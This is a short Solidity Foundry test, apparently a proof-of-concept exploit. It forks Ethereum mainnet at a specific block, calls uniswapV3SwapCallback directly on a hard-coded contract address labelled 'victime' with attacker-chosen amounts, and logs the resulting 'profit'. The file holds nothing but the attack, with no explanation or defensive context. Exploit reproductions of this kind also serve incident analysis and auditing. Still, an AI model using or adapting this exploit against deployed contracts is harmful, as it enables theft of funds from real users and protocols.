// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Adjusted import path after installing forge-std library
import {console, Test} from "forge-std/Test.sol";

interface IVictime {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes memory data) external;
}

contract XXXExploit is Test {
    address victime_ = address(0x3328F7f4A1D1C57c35df56bBf0c9dCAFCA309C49);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20763484);
    }

    function testExploit() public {
        bytes memory data = abi.encode(
            bool(true)
        );

        IVictime(victime_).uniswapV3SwapCallback(
            13310336193126115279,
            13310336193126115279,
            data 
        );

        emit log_named_decimal_uint("profit = ", address(this).balance, 18);
    }
    receive() external payable {}
}
